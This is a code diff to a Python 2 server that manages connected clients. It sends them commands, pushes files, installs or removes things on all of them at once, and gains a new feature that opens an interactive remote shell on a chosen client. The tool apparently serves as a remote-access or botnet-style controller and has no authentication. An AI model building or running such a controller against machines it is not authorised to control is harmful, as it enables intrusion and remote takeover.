@@ -4,9 +4,10 @@ import socket
 import threading
 import os.path
 import time
+import random
+
 
 class Server:
-
     def __init__(self, host, port):
         self.host = host
         self.port = port
@@ -20,7 +21,7 @@ class Server:
 
         while True:
             conn, addr = self.s.accept()
-            t = threading.Thread(target = self.listenToConnections, args = (conn, addr))
+            t = threading.Thread(target=self.listenToConnections, args=(conn, addr))
             conns.setConnection(addr[0], conn, addr, t)
 
     def listenToConnections(self, conn, addr):
@@ -39,8 +40,8 @@ class Server:
                 conn.close()
                 return False
 
-class Connections:
 
+class Connections:
     def __init__(self):
         self.connections = {}
 
@@ -51,7 +52,7 @@ class Connections:
         return self.connections
 
 
-def showClients ():
+def showClients():
     clients = conns.getConnections()
 
     for client in clients:
@@ -59,7 +60,8 @@ def showClients ():
 
     back_to_menu()
 
-def sendCommand ():
+
+def sendCommand():
     selected = selectionHelper()
 
     if not selected:
@@ -72,8 +74,8 @@ def sendCommand ():
         "selection": selected,
     })
 
-def transferFile ():
 
+def transferFile():
     selected = selectionHelper()
 
     if selected:
@@ -109,7 +111,8 @@ def transferFile ():
 
     back_to_menu()
 
-def install_on_client ():
+
+def installOnClient():
     selected = selectionHelper()
 
     if not selected:
@@ -121,7 +124,8 @@ def install_on_client ():
         "selection": selected,
     })
 
-def remove_on_client ():
+
+def removeOnClient():
     selected = selectionHelper()
 
     if not selected:
@@ -133,7 +137,39 @@ def remove_on_client ():
         "selection": selected,
     })
 
-def selectionHelper ():
+
+def sendClientShell():
+    # TODO: improve shell this one sucks
+
+    selected = selectionHelper('single')
+
+    if not selected:
+        back_to_menu()
+
+    s = selected[1]['socket']
+    addr = selected[1]['addr'][0]
+
+    shellPort = random.randint(1338, 2222)
+    s.send('SHEL "%d"' % shellPort)
+
+    time.sleep(1)
+
+    print "connecting to %s:%d" % (addr, shellPort)
+    shellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    shellSocket.connect((addr, shellPort))
+    shellSocket.send("uname -a")
+
+    while True:
+
+        res = shellSocket.recv(1024)
+        print res
+        cmd = raw_input("[%s]: " % addr)
+
+        if cmd:
+            shellSocket.send(cmd)
+
+
+def selectionHelper(single=False):
     clients = conns.getConnections()
 
     if clients.__len__() == 0:
@@ -157,33 +193,41 @@ def selectionHelper ():
         print "%d) [%s %s]" % (i, ip, hostname)
         selection[str(i)] = {"socket": s, "thread": t, "addr": addr}
         i = i + 1
-
-    userInput = raw_input('Select a client (0 for all): ')
-
-    if userInput == "0":
-
-        selectedClients = {}
-
-        i = 1
-        for client in clients:
-            selectedClients[i] = clients[client]
-            i = i + 1
-
-        return selectedClients
-
-    else:
+    if single:
+        userInput = raw_input('Select a client (single): ')
         selected = selection.get(userInput, False)
 
-    if selected:
-        return {1: selection[userInput]}
+        if selected:
+            return {1: selection[userInput]}
+
+        else:
+            print "Wrong selection"
+            selectionHelper('single')
+
+    else:
+        userInput = raw_input('Select a client (0 for all): ')
+
+        if userInput == "0":
+
+            selectedClients = {}
+
+            i = 1
+            for client in clients:
+                selectedClients[i] = clients[client]
+                i = i + 1
+
+            return selectedClients
+
+        else:
+            selected = selection.get(userInput, False)
+
+        if selected:
+            return {1: selection[userInput]}
 
     return False
 
 
-
-
 def clientsHelper(options):
-
     selection = options["selection"]
     prefix = options["prefix"]
     prompt = options["raw_input_text"]
@@ -210,8 +254,8 @@ def clientsHelper(options):
 
     back_to_menu()
 
-def fileSendHelper (socket, filePath, fileDest):
 
+def fileSendHelper(socket, filePath, fileDest):
     fileSrc = open(filePath, 'rb')
     fileSize = os.path.getsize(filePath)
     fileData = fileSrc.read(1024)
@@ -228,14 +272,15 @@ def fileSendHelper (socket, filePath, fileDest):
     res = socket.recv(16)
     return res
 
-def proccess_user_selection (option):
 
+def proccess_user_selection(option):
     user_select = {
         1: showClients,
         2: sendCommand,
         3: transferFile,
-        4: install_on_client,
-        5: remove_on_client
+        4: installOnClient,
+        5: removeOnClient,
+        6: sendClientShell
     }
 
     if not option == '' and option.isdigit() and int(option) in user_select:
@@ -246,33 +291,36 @@ def proccess_user_selection (option):
         print "Invalid option"
         back_to_menu()
 
-def back_to_menu ():
+
+def back_to_menu():
     raw_input('Press enter to contiue...')
     menu()
 
-def menu ():
 
+def menu():
     print """
-      1) Show all clients
-      2) Send commands to all clients
+      1) Show clients
+      2) Send command to clients
       3) Transfer file to clients
-      4) Install something on all clients
-      5) Remove something from all clients
+      4) Install on clients
+      5) Remove on clients
+      6) Shell on a client
       """
 
     user_input = raw_input("-> ")
 
     proccess_user_selection(user_input)
 
-def main ():
 
+def main():
     global conns
     conns = Connections()
     server = Server('0.0.0.0', 1337)
-    t = threading.Thread(target= server.listen)
+    t = threading.Thread(target=server.listen)
     t.setDaemon(True)
     t.start()
 
     menu()
+
 
 main()
